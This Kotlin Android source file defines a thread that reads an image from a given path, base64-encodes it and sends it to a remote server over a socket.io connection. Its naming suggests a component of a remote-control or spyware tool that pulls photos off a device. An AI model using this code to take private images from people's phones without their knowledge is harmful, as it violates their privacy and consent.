package me.hawkshaw.tasks

import android.content.Context
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.util.Base64
import io.socket.client.Socket
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.FileInputStream

class DownloadImage(private val ctx: Context, private val socket: Socket, private val path: String) : Thread() {


    private fun downloadImage(path: String, socket: Socket) {

        val data = JSONObject()
        data.put("name", File(path).name)
        data.put("image64", encodeImage(path))
        data.put("dataType", "downloadImage")

        socket.emit("usrData", data)
    }

    private fun encodeImage(path: String): String {

        val imageFile = File(path)
        val fis = FileInputStream(imageFile)

        val bm = BitmapFactory.decodeStream(fis)
        val baos = ByteArrayOutputStream()
        bm.compress(Bitmap.CompressFormat.JPEG, 100, baos)
        val b = baos.toByteArray()
        return Base64.encodeToString(b, Base64.DEFAULT)
    }

    override fun run() {
        super.run()

        downloadImage(path, socket)
    }
}